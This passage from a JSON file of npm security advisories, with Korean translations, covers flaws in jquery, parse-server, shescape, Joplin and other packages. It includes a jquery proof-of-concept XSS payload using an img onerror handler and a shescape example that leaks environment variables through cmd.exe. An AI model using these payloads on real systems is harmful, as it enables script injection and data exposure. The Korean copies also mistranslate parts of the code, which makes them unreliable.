    "references": "https://github.com/fastify/fastify-oauth2/security/advisories/GHSA-g8x5-p9qc-cf95\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-35935\nhttps://github.com/fastify/fastify-oauth2/commit/bff756b456cbb769080631af2beb85671ff4c79c\nhttps://auth0.com/docs/secure/attack-protection/state-parameters\nhttps://github.com/fastify/fastify-oauth2/releases/tag/v7.2.0\nhttps://github.com/advisories/GHSA-g8x5-p9qc-cf95",
    "name": "@fastify/oauth2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.2.0",
    "identifier": "7.2.0",
    "descriptionKR": "### 영향\n\n@fastify/oauth2의 모든 버전은 시작 시 정적으로 생성된 `state` 매개변수를 사용했으며 모든 사용자에 대한 모든 요청에서 사용되었습니다.\nOauth2 `state` 매개변수의 목적은 Cross-Site-Request-Forgery 공격을 방지하는 것입니다. 따라서 사용자마다 고유해야 하며 서버에서 유효성을 검사할 수 있는 방식으로 사용자의 세션에 연결되어야 합니다.\n\n### 패치\n\nv7.2.0은 `http-only` 및 `same-site=lax` 속성이 설정된 쿠키에 `state`를 저장하도록 기본 동작을 변경합니다. 이제 기본적으로 모든 사용자에 대해 상태가 생성됩니다.\n\n여기에는 `checkStateFunction` 함수의 브레이킹 체인지가 포함되어 이제 전체 `Request` 개체를 허용합니다.\n\n### 해결 방법\n\n알려진 해결 방법이 없습니다.\n\n### 참조\n\n* [OAuth 2.0 상태 매개변수로 공격 방지 및 사용자 리디렉션](https://auth0.com/docs/secure/attack-protection/state-parameters)"
  },
  {
    "description": "### Impact\n\nAn attacker can use this prototype pollution sink to trigger a remote code execution through the MongoDB BSON parser.\n\n### Patches\n\nPrevent prototype pollution in MongoDB database adapter.\n\n### Workarounds\n\nDisable remote code execution through the MongoDB BSON parser.\n\n### Credits\n\n- Discovered by hir0ot working with Trend Micro Zero Day Initiative\n- Fixed by dbythy\n- Reviewed by mtrezza\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-462x-c3jw-7vr6\n- https://github.com/advisories/GHSA-prm5-8g2m-24gg\n\n",
    "identifiers": "GHSA : GHSA-462x-c3jw-7vr6\nCVE : CVE-2023-36475",
    "severity": "CRITICAL",
    "updatedAt": "2023-06-30T20:41:45Z",
    "publishedAt": "2023-06-30T20:41:43Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-462x-c3jw-7vr6\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-36475\nhttps://github.com/parse-community/parse-server/issues/8674\nhttps://github.com/parse-community/parse-server/issues/8675\nhttps://github.com/parse-community/parse-server/commit/3dd99dd80e27e5e1d99b42844180546d90c7aa90\nhttps://github.com/parse-community/parse-server/commit/5fad2928fb8ee17304abcdcf259932f827d8c81f\nhttps://github.com/parse-community/parse-server/releases/tag/5.5.2\nhttps://github.com/parse-community/parse-server/releases/tag/6.2.1\nhttps://github.com/advisories/GHSA-462x-c3jw-7vr6",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.2.1",
    "identifier": "6.2.1",
    "descriptionKR": "### 영향\n\n공격자는 이 프로토타입 오염 싱크를 사용하여 MongoDB BSON 파서를 통해 원격 코드 실행을 트리거할 수 있습니다.\n\n### 패치\n\nMongoDB 데이터베이스 어댑터의 프로토타입 오염을 방지합니다.\n\n### 해결 방법\n\nMongoDB BSON 파서를 통해 원격 코드 실행을 비활성화합니다.\n\n### 크레딧\n\n- Trend Micro Zero Day Initiative와 협력하는 hir0ot에 의해 발견됨\n-dbythy에 의해 수정됨\n- mtrezza 리뷰\n\n### 참조\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-462x-c3jw-7vr6\n- https://github.com/advisories/GHSA-prm5-8g2m-24gg"
  },
  {
    "description": "### Impact\n\nAn attacker can use this prototype pollution sink to trigger a remote code execution through the MongoDB BSON parser.\n\n### Patches\n\nPrevent prototype pollution in MongoDB database adapter.\n\n### Workarounds\n\nDisable remote code execution through the MongoDB BSON parser.\n\n### Credits\n\n- Discovered by hir0ot working with Trend Micro Zero Day Initiative\n- Fixed by dbythy\n- Reviewed by mtrezza\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-462x-c3jw-7vr6\n- https://github.com/advisories/GHSA-prm5-8g2m-24gg\n\n",
    "identifiers": "GHSA : GHSA-462x-c3jw-7vr6\nCVE : CVE-2023-36475",
    "severity": "CRITICAL",
    "updatedAt": "2023-06-30T20:41:45Z",
    "publishedAt": "2023-06-30T20:41:43Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-462x-c3jw-7vr6\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-36475\nhttps://github.com/parse-community/parse-server/issues/8674\nhttps://github.com/parse-community/parse-server/issues/8675\nhttps://github.com/parse-community/parse-server/commit/3dd99dd80e27e5e1d99b42844180546d90c7aa90\nhttps://github.com/parse-community/parse-server/commit/5fad2928fb8ee17304abcdcf259932f827d8c81f\nhttps://github.com/parse-community/parse-server/releases/tag/5.5.2\nhttps://github.com/parse-community/parse-server/releases/tag/6.2.1\nhttps://github.com/advisories/GHSA-462x-c3jw-7vr6",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.5.2",
    "identifier": "5.5.2",
    "descriptionKR": "### 영향\n\n공격자는 이 프로토타입 오염 싱크를 사용하여 MongoDB BSON 파서를 통해 원격 코드 실행을 트리거할 수 있습니다.\n\n### 패치\n\nMongoDB 데이터베이스 어댑터의 프로토타입 오염을 방지합니다.\n\n### 해결 방법\n\nMongoDB BSON 파서를 통해 원격 코드 실행을 비활성화합니다.\n\n### 크레딧\n\n- Trend Micro Zero Day Initiative와 협력하는 hir0ot에 의해 발견됨\n-dbythy에 의해 수정됨\n- mtrezza 리뷰\n\n### 참조\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-462x-c3jw-7vr6\n- https://github.com/advisories/GHSA-prm5-8g2m-24gg"
  },
  {
    "description": "In NocoDB prior to 0.91.7, the SMTP plugin doesn't have verification or validation. This allows attackers to make requests to internal servers and read the contents.",
    "identifiers": "GHSA : GHSA-mx8q-jqwm-85mv\nCVE : CVE-2022-2062",
    "severity": "HIGH",
    "updatedAt": "2023-06-30T20:40:24Z",
    "publishedAt": "2022-06-14T00:00:37Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2062\nhttps://github.com/nocodb/nocodb/commit/a18f5dd53811b9ec1c1bb2fdbfb328c0c87d7fb4\nhttps://huntr.dev/bounties/35593b4c-f127-4699-8ad3-f0b2203a8ef6\nhttps://github.com/advisories/GHSA-mx8q-jqwm-85mv",
    "name": "nocodb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.91.7",
    "identifier": "0.91.7",
    "descriptionKR": "0.91.7 이전의 NocoDB에서는 SMTP 플러그인에 확인 또는 유효성 검사가 없습니다. 이를 통해 공격자는 내부 서버에 요청하고 내용을 읽을 수 있습니다."
  },
  {
    "description": "Joplin before 2.11.5 allows XSS via an AREA element of an image map.",
    "identifiers": "GHSA : GHSA-4jjv-p8x9-rrf7\nCVE : CVE-2023-37299",
    "severity": "MODERATE",
    "updatedAt": "2023-07-06T21:39:15Z",
    "publishedAt": "2023-06-30T15:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-37299\nhttps://github.com/laurent22/joplin/commit/9e90d9016daf79b5414646a93fd369aedb035071\nhttps://github.com/laurent22/joplin/releases/tag/v2.11.5\nhttps://vuln.ryotak.net/advisories/68\nhttps://github.com/advisories/GHSA-4jjv-p8x9-rrf7",
    "name": "joplin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.11.5",
    "identifier": "2.11.5",
    "descriptionKR": "2.11.5 이전의 Joplin은 이미지 맵의 AREA 요소를 통해 XSS를 허용합니다."
  },
  {
    "description": "Joplin before 2.11.5 allows XSS via a USE element in an SVG document.",
    "identifiers": "GHSA : GHSA-7grw-xfx6-qhx6\nCVE : CVE-2023-37298",
    "severity": "MODERATE",
    "updatedAt": "2023-07-06T21:39:17Z",
    "publishedAt": "2023-06-30T15:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-37298\nhttps://github.com/laurent22/joplin/commit/caf66068bfc474bbfd505013076ed173cd90ca83\nhttps://github.com/laurent22/joplin/releases/tag/v2.11.5\nhttps://vuln.ryotak.net/advisories/69\nhttps://github.com/advisories/GHSA-7grw-xfx6-qhx6",
    "name": "joplin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.11.5",
    "identifier": "2.11.5",
    "descriptionKR": "2.11.5 이전의 Joplin은 SVG 문서의 USE 요소를 통해 XSS를 허용합니다."
  },
  {
    "description": "All versions of the package flatnest are vulnerable to Prototype Pollution via the `nest()` function in `flatnest/nest.js` file.",
    "identifiers": "GHSA : GHSA-7px2-3c2p-q4v4\nCVE : CVE-2023-26135",
    "severity": "HIGH",
    "updatedAt": "2023-07-07T18:40:18Z",
    "publishedAt": "2023-06-30T06:30:14Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26135\nhttps://github.com/brycebaril/node-flatnest/issues/4\nhttps://security.snyk.io/vuln/SNYK-JS-FLATNEST-3185149\nhttps://github.com/brycebaril/node-flatnest/blob/b7d97ec64a04632378db87fcf3577bd51ac3ee39/nest.js#L43\nhttps://github.com/brycebaril/node-flatnest/blob/b7d97ec64a04632378db87fcf3577bd51ac3ee39/nest.js%23L43\nhttps://github.com/advisories/GHSA-7px2-3c2p-q4v4",
    "name": "flatnest",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "descriptionKR": "flatnest 패키지의 모든 버전은 `flatnest/nest.js` 파일의 `nest()` 함수를 통한 Prototype Pollution에 취약합니다."
  },
  {
    "description": "angular-ui-notification v0.1.0, v0.2.0, and v0.3.6 was discovered to contain a cross-site scripting (XSS) vulnerability.",
    "identifiers": "GHSA : GHSA-mrcj-5qxr-vhp2\nCVE : CVE-2023-34840",
    "severity": "MODERATE",
    "updatedAt": "2023-07-07T16:28:14Z",
    "publishedAt": "2023-06-30T18:31:01Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-34840\nhttps://github.com/Xh4H/CVE-2023-34840\nhttps://github.com/alexcrack/angular-ui-notification\nhttp://alexcrack.com\nhttps://github.com/advisories/GHSA-mrcj-5qxr-vhp2",
    "name": "angular-ui-notification",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.1.0, <= 0.3.6",
    "descriptionKR": "angular-ui-notification v0.1.0, v0.2.0 및 v0.3.6에 XSS(교차 사이트 스크립팅) 취약점이 포함되어 있는 것으로 확인되었습니다."
  },
  {
    "description": "Versions of the package git-commit-info before 2.0.2 are vulnerable to Command Injection such that the package-exported method gitCommitInfo() fails to sanitize its parameter commit, which later flows into a sensitive command execution API. As a result, attackers may inject malicious commands once they control the hash content.",
    "identifiers": "GHSA : GHSA-h42j-mrmp-9369\nCVE : CVE-2023-26134",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-06T19:30:50Z",
    "publishedAt": "2023-06-28T06:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26134\nhttps://github.com/JPeer264/node-git-commit-info/issues/24\nhttps://github.com/JPeer264/node-git-commit-info/commit/f7c491ede51f886a988af9b266797cb24591d18c\nhttps://security.snyk.io/vuln/SNYK-JS-GITCOMMITINFO-5740174\nhttps://github.com/advisories/GHSA-h42j-mrmp-9369",
    "name": "git-commit-info",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.2",
    "identifier": "2.0.2",
    "descriptionKR": "2.0.2 이전 버전의 git-commit-info 패키지는 명령 주입에 취약하여 패키지에서 내보낸 메서드 gitCommitInfo()가 나중에 민감한 명령 실행 API로 흘러가는 매개 변수 커밋을 삭제하지 못합니다. 결과적으로 공격자는 해시 콘텐츠를 제어하면 악의적인 명령을 주입할 수 있습니다."
  },
  {
    "description": "Affected versions of `jquery` are vulnerable to cross-site scripting. This occurs because the main `jquery` function uses a regular expression to differentiate between HTML and selectors, but does not properly anchor the regular expression. The result is that `jquery` may interpret HTML as selectors when given certain inputs, allowing for client side code execution.\n\n## Proof of Concept\n```\n$(\"#log\").html(\n    $(\"element[attribute='<img src=\\\"x\\\" onerror=\\\"alert(1)\\\" />']\").html()\n);\n```\n\n\n\n\n## Recommendation\n\nUpdate to version 1.9.0 or later.",
    "identifiers": "GHSA : GHSA-2pqj-h3vj-pqgw\nCVE : CVE-2012-6708",
    "severity": "MODERATE",
    "updatedAt": "2023-07-10T13:00:14Z",
    "publishedAt": "2020-09-01T16:41:46Z",
    "references": "https://bugs.jquery.com/ticket/11290\nhttps://bugs.jquery.com/ticket/12531\nhttps://bugs.jquery.com/ticket/6429\nhttps://bugs.jquery.com/ticket/9521\nhttps://nvd.nist.gov/vuln/detail/CVE-2017-16011\nhttps://nvd.nist.gov/vuln/detail/CVE-2012-6708\nhttps://github.com/jquery/jquery/commit/05531fc4080ae24070930d15ae0cea7ae056457d\nhttps://help.ecostruxureit.com/display/public/UADCE725/Security+fixes+in+StruxureWare+Data+Center+Expert+v7.6.0\nhttps://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E\nhttps://snyk.io/vuln/npm:jquery:20120206\nhttp://lists.opensuse.org/opensuse-security-announce/2020-03/msg00041.html\nhttp://packetstormsecurity.com/files/153237/RetireJS-CORS-Issue-Script-Execution.html\nhttp://packetstormsecurity.com/files/161972/Linksys-EA7500-2.0.8.194281-Cross-Site-Scripting.html\nhttps://security.snyk.io/vuln/SNYK-DOTNET-JQUERY-450223\nhttps://research.insecurelabs.org/jquery/test/\nhttps://web.archive.org/web/20200227132049/http://www.securityfocus.com/bid/102792\nhttps://github.com/rails/jquery-rails/blob/v2.1.4/vendor/assets/javascripts/jquery.js#L59\nhttps://github.com/rails/jquery-rails/blob/v2.2.0/vendor/assets/javascripts/jquery.js#L67\nhttps://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2012-6708.yml\nhttps://github.com/advisories/GHSA-2pqj-h3vj-pqgw",
    "name": "jquery",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.8.3",
    "identifier": "1.9.0",
    "descriptionKR": "영향을 받는 `jquery` 버전은 교차 사이트 스크립팅에 취약합니다. 이는 기본 'jquery' 함수가 정규식을 사용하여 HTML과 선택자를 구분하지만 정규식을 제대로 고정하지 않기 때문에 발생합니다. 그 결과 'jquery'는 특정 입력이 주어지면 HTML을 선택자로 해석하여 클라이언트 측 코드 실행을 허용할 수 있습니다.\n\n## 개념의 증거\n```\n$(\"#로그\").html(\n    $(\"요소[속성='<img src=\\\"x\\\" onerror=\\\"alert(1)\\\" />']\").html()\n);\n```\n\n\n\n\n## 추천\n\n버전 1.9.0 이상으로 업데이트하십시오."
  },
  {
    "description": "he Nuxt dev server between versions 3.4.0 and 3.4.3 is vulnerable to code injection when it is exposed publicly.",
    "identifiers": "GHSA : GHSA-gc34-5v43-h7v8\nCVE : CVE-2023-3224",
    "severity": "HIGH",
    "updatedAt": "2023-06-22T20:04:02Z",
    "publishedAt": "2023-06-13T18:30:40Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-3224\nhttps://github.com/nuxt/nuxt/commit/65a8f4eb3ef1b249a95fd59e323835a96428baff\nhttps://huntr.dev/bounties/1eb74fd8-0258-4c1f-a904-83b52e373a87\nhttps://github.com/nuxt/nuxt/commits/v3.4.3\nhttps://github.com/nuxt/nuxt/issues/21694\nhttps://github.com/nuxt/nuxt/commit/72ba53efbc2384f802d654fffd92eaf36a81b507\nhttps://github.com/advisories/GHSA-gc34-5v43-h7v8",
    "name": "nuxt",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.4.0, < 3.4.3",
    "identifier": "3.4.3",
    "descriptionKR": "버전 3.4.0과 3.4.3 사이의 Nuxt 개발 서버는 공개적으로 노출될 때 코드 주입에 취약합니다."
  },
  {
    "description": "### Impact\n\nThis impact users of Shescape:\n\n1. On Windows using the Windows Command Prompt (i.e. `cmd.exe`), and\n2. Using `quote`/`quoteAll` or `escape`/`escapeAll` with the `interpolation` option set to `true`.\n\nAn attacker may be able to get read-only access to environment variables. Example:\n\n```javascript\nimport * as cp from \"node:child_process\";\nimport * as shescape from \"shescape\";\n\n// 1. Prerequisites\nconst options = {\n    shell: \"cmd.exe\",\n    // Or\n    shell: undefined, // Only if the default shell is CMD\n\n    // And\n    interpolation: true, // Only applies to `escape` and `escapeAll` usage\n}\n\n// 2. Attack (one of many)\nconst payload = \"%PATH%\";\n\n// 3. Usage\nlet escapedPayload;\n\nescapedPayload = shescape.quote(payload, options);\n// Or\nescapedPayload = shescape.quoteAll([payload], options);\n// Or\nescapedPayload = shescape.escape(payload, options);\n// Or\nescapedPayload = shescape.escapeAll([payload], options);\n\n// And (example)\nconst result = cp.execSync(`echo Hello ${escapedPayload}`, options);\n\n// 4. Impact\nconsole.log(result.toString());\n// Outputs \"Hello\" followed by the contents of the PATH environment variable\n```\n\n### Patches\n\nThis bug has been patched in [v1.7.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.7.1) which you can upgrade to now. No further changes are required.\n\n### Workarounds\n\nAlternatively, users can remove all instances of `%` from user input, either before or after using Shescape.\n\n### References\n\n- Shescape Pull request [#982](https://github.com/ericcornelissen/shescape/pull/982)\n- Shescape commit [`d0fce70`](https://github.com/ericcornelissen/shescape/commit/d0fce70f987ac0d8331f93cb45d47e79436173ac)\n- Shescape Release [v1.7.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.7.1)\n",
    "identifiers": "GHSA : GHSA-3g7p-8qhx-mc8r\nCVE : CVE-2023-35931",
    "severity": "LOW",
    "updatedAt": "2023-06-27T23:07:50Z",
    "publishedAt": "2023-06-22T20:01:39Z",
    "references": "https://github.com/ericcornelissen/shescape/security/advisories/GHSA-3g7p-8qhx-mc8r\nhttps://github.com/ericcornelissen/shescape/pull/982\nhttps://github.com/ericcornelissen/shescape/commit/d0fce70f987ac0d8331f93cb45d47e79436173ac\nhttps://github.com/ericcornelissen/shescape/releases/tag/v1.7.1\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-35931\nhttps://github.com/advisories/GHSA-3g7p-8qhx-mc8r",
    "name": "shescape",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.7.1",
    "identifier": "1.7.1",
    "descriptionKR": "### 영향\n\n이는 Shescape 사용자에게 다음과 같은 영향을 미칩니다.\n\n1. Windows에서 Windows 명령 프롬프트(예: `cmd.exe`)를 사용하고\n2. `interpolation` 옵션이 `true`로 설정된 `quote`/`quoteAll` 또는 `escape`/`escapeAll` 사용.\n\n공격자는 환경 변수에 대한 읽기 전용 액세스 권한을 얻을 수 있습니다. 예:\n\n```자바스크립트\nimport * as cp from \"node:child_process\";\n\"shescape\"에서 *를 shescape로 가져오기;\n\n// 1. 전제 조건\nconst 옵션 = {\n    쉘: \"cmd.exe\",\n    // 또는\n    shell: undefined, // 기본 쉘이 CMD인 경우에만\n\n    // 그리고\n    interpolation: true, // `escape` 및 `escapeAll` 사용에만 적용됩니다.\n}\n\n// 2. 공격(많은 것 중 하나)\nconst 페이로드 = \"%PATH%\";\n\n// 3. 사용법\nlet escapedPayload;\n\nescapedPayload = shescape.quote(페이로드, 옵션);\n// 또는\nescapedPayload = shescape.quoteAll([페이로드], 옵션);\n// 또는\nescapedPayload = shescape.escape(페이로드, 옵션);\n// 또는\nescapedPayload = shescape.escapeAll([페이로드], 옵션);\n\n// 그리고 (예시)\nconst result = cp.execSync(`echo Hello ${escapedPayload}`, options);\n\n// 4. 영향\nconsole.log(result.toString());\n// \"Hello\" 다음에 PATH 환경 변수의 내용을 출력합니다.\n```\n\n### 패치\n\n이 버그는 [v1.7.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.7.1)에서 패치되었으며 지금 업그레이드할 수 있습니다. 추가 변경이 필요하지 않습니다.\n\n### 해결 방법\n\n또는 사용자는 Shescape를 사용하기 전이나 후에 사용자 입력에서 '%'의 모든 인스턴스를 제거할 수 있습니다.\n\n### 참조\n\n- Shescape 풀 요청 [#982](https://github.com/ericcornelissen/shescape/pull/982)\n- Shescape 커밋 [`d0fce70`](https://github.com/ericcornelissen/shescape/commit/d0fce70f987ac0d8331f93cb45d47e79436173ac)\n- Shescape 릴리스 [v1.7.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.7.1)"
  },
  {
    "description": "### Summary\nThis is a comment on https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-6w63-h3fj-q4vw and the patches fixing it.\n\n### Details\nThe code which validates a name calls the validator:\nhttps://github.com/NaturalIntelligence/fast-xml-parser/blob/ecf6016f9b48aec1a921e673158be0773d07283e/src/xmlparser/DocTypeReader.js#L145-L153\nThis checks for the presence of an invalid character.  Such an approach is always risky, as it is so easy to forget to include an invalid character in the list.  A safer approach is to validate entity names against the XML specification: https://www.w3.org/TR/xml11/#sec-common-syn - an ENTITY name is a Name:\n\n```\n[4]   NameStartChar ::= \":\" | [A-Z] | \"_\" | [a-z] | [#xC0-#xD6] | [#xD8-#xF6] | [#xF8-#x2FF] | [#x370-#x37D] |\n                        [#x37F-#x1FFF] | [#x200C-#x200D] | [#x2070-#x218F] | [#x2C00-#x2FEF] | [#x3001-#xD7FF] |\n                        [#xF900-#xFDCF] | [#xFDF0-#xFFFD] | [#x10000-#xEFFFF]\n[4a]  NameChar ::= NameStartChar | \"-\" | \".\" | [0-9] | #xB7 | [#x0300-#x036F] | [#x203F-#x2040]\n[5]   Name ::= NameStartChar (NameChar)*\n```\n\nso the safest way to validate an entity name is to build a regex to represent this expression and check whether the name given matches the regex.  (Something along the lines of `/^[name start char class][name char class]*$/`.)  There's probably a nice way to simplify the explicit list rather than typing it out verbatim using Unicode character properties, but I don't know enough to do so.",
    "identifiers": "GHSA : GHSA-gpv5-7x3g-ghjv",
    "severity": "LOW",
    "updatedAt": "2023-06-22T18:28:10Z",
    "publishedAt": "2023-06-15T19:05:13Z",
    "references": "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-6w63-h3fj-q4vw\nhttps://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gpv5-7x3g-ghjv\nhttps://github.com/NaturalIntelligence/fast-xml-parser/commit/9a880b887916855c3a510869fd1ee268d7fe58b1\nhttps://github.com/advisories/GHSA-gpv5-7x3g-ghjv",
    "name": "fast-xml-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 4.2.4",
    "identifier": "4.2.5",
    "descriptionKR": "### 요약\n이것은 https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-6w63-h3fj-q4vw 및 이를 수정하는 패치에 대한 설명입니다.\n\n### 세부 정보\n이름의 유효성을 검사하는 코드는 유효성 검사기를 호출합니다.\nhttps://github.com/NaturalIntelligence/fast-xml-parser/blob/ecf6016f9b48aec1a921e673158be0773d07283e/src/xmlparser/DocTypeReader.js#L145-L153\n유효하지 않은 문자가 있는지 확인합니다. 이러한 접근 방식은 목록에 잘못된 문자를 포함하는 것을 잊기 쉽기 때문에 항상 위험합니다. 더 안전한 접근 방식은 XML 사양에 대해 엔티티 이름의 유효성을 검사하는 것입니다. https://www.w3.org/TR/xml11/#sec-common-syn - ENTITY 이름은 이름입니다.\n\n```\n[4] NameStartChar ::= \":\" | [AZ] | \"_\" | [AZ] | [#xC0-#xD6] | [#xD8-#xF6] | [#xF8-#x2FF] | [#x370-#x37D] |\n                        [#x37F-#x1FFF] | [#x200C-#x200D] | [#x2070-#x218F] | [#x2C00-#x2FEF] | [#x3001-#xD7FF] |\n                        [#xF900-#xFDCF] | [#xFDF0-#xFFFD] | [#x10000-#xEFFFFF]\n[4a] NameChar ::= NameStartChar | \"-\" | \".\" | [0-9] | #xB7 | [#x0300-#x036F] | [#x203F-#x2040]\n[5] 이름 ::= NameStartChar (NameChar)*\n```\n\n따라서 엔터티 이름을 확인하는 가장 안전한 방법은 이 표현식을 나타내는 정규식을 작성하고 주어진 이름이 정규식과 일치하는지 확인하는 것입니다. (`/^[name start char class][name char class]*$/`와 같은 내용입니다.) 유니코드 문자 속성을 사용하여 그대로 입력하는 것보다 명시적 목록을 단순화하는 좋은 방법이 있을 수 있지만 저는 그렇게 할 만큼 충분히 알지 못한다."
  },
  {
    "description": "## Information\nPlease note that this is not a new disclosure, and is previously reported in our [SECURITY-NOTICE.md](https://github.com/auth0/passport-wsfed-saml2/commit/520b9fc0bb4249ce83bec47e30153419f086ab70\n) which we removed in favor of github advisory. \n\n# Overview\n\nA vulnerability was found in the validation of a SAML signature. The validation doesn't ensure that the \"Signature\" tag is at the proper location inside an \"Assertion\" tag. This leads to a signature relocation attack where the attacker can corrupt one field of data while maintaining the signature valid. This could allow an authenticated attacker to \"remove\" one group from the assertion or corrupt another field of an assertion.\n\n# Am I affected?\n\nYou are affected if you are using the passport-wsfed-saml2 library to version < 3.0.10\n\n# How do I fix it?\n\nYou may fix this issue by upgrading passport-wsfed-saml2 library to version 3.0.10 or above. \n\n# Will the fix impact my users?\n\nThis fix patches the library that your application runs, but will not impact your users, their current state, or any existing sessions.\n",
    "identifiers": "GHSA : GHSA-5wrg-8fxp-cx9r",
    "severity": "HIGH",
    "updatedAt": "2023-06-21T22:06:24Z",
    "publishedAt": "2023-06-21T22:06:22Z",
    "references": "https://github.com/auth0/passport-wsfed-saml2/security/advisories/GHSA-5wrg-8fxp-cx9r\nhttps://github.com/auth0/passport-wsfed-saml2/pull/79\nhttps://github.com/auth0/passport-wsfed-saml2/commit/f75211d42d2586a0d24a9da29ba8590e42363500\nhttps://github.com/advisories/GHSA-5wrg-8fxp-cx9r",
    "name": "passport-wsfed-saml2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.10",
    "identifier": "3.0.10",
    "descriptionKR": "## 정보\n이것은 새로운 공개가 아니며 이전에 [SECURITY-NOTICE.md](https://github.com/auth0/passport-wsfed-saml2/commit/520b9fc0bb4249ce83bec47e30153419f086ab70)에 보고되었습니다.\n) 우리는 github 권고에 찬성하여 제거했습니다.\n\n# 개요\n\nSAML 서명 유효성 검사에서 취약점이 발견되었습니다. 유효성 검사는 \"Signature\" 태그가 \"Assertion\" 태그 내의 적절한 위치에 있는지 확인하지 않습니다. 이로 인해 공격자가 서명을 유효하게 유지하면서 데이터의 한 필드를 손상시킬 수 있는 서명 재배치 공격이 발생합니다. 이로 인해 인증된 공격자가 어설션에서 한 그룹을 \"제거\"하거나 어설션의 다른 필드를 손상시킬 수 있습니다.\n\n# 영향을 받나요?\n\n3.0.10 미만 버전의 passport-wsfed-saml2 라이브러리를 사용하는 경우 영향을 받습니다.\n\n# 어떻게 고칠 수 있나요?\n\npassport-wsfed-saml2 라이브러리를 버전 3.0.10 이상으로 업그레이드하여 이 문제를 해결할 수 있습니다.\n\n# 수정 사항이 내 사용자에게 영향을 미칩니까?\n\n이 수정 사항은 애플리케이션이 실행하는 라이브러리를 패치하지만 사용자, 현재 상태 또는 기존 세션에는 영향을 미치지 않습니다."
  },
  {
    "description": "The Backstage scaffolder-backend plugin uses a templating library that requires a sandbox, as it by design allows for code injection. The library used for this sandbox so far has been `vm2`, but in light of several past vulnerabilities and existing vulnerabilities  that may not have a fix, the plugin has switched to using a different sandbox library.\n\n### Impact\n\nA malicious actor with write access to a registered scaffolder template could manipulate the template in a way that allows for remote code execution on the scaffolder-backend instance. This was only exploitable in the template YAML definition itself and not by user input data.\n\n### Patches\n\nThis is vulnerability is fixed in version 1.15.0 of `@backstage/plugin-scaffolder-backend`.\n\n### Workarounds\n\nNote that the [Backstage Threat Model](https://backstage.io/docs/overview/threat-model) states that scaffolder templates are considered to be a sensitive area that with the recommendation that you control access and perform manual reviews of changes to the scaffolder templates. The exploit is of a nature where it is easily discoverable in manual review.",
    "identifiers": "GHSA : GHSA-wg6p-jmpc-xjmr\nCVE : CVE-2023-35926",
    "severity": "HIGH",
    "updatedAt": "2023-06-22T17:31:39Z",
    "publishedAt": "2023-06-21T22:00:30Z",
    "references": "https://github.com/backstage/backstage/security/advisories/GHSA-wg6p-jmpc-xjmr\nhttps://github.com/backstage/backstage/commit/fb7375507d56faedcb7bb3665480070593c8949a\nhttps://github.com/backstage/backstage/releases/tag/v1.15.0\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-35926\nhttps://github.com/advisories/GHSA-wg6p-jmpc-xjmr",
    "name": "@backstage/plugin-scaffolder-backend",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.15.0",
    "identifier": "1.15.0",
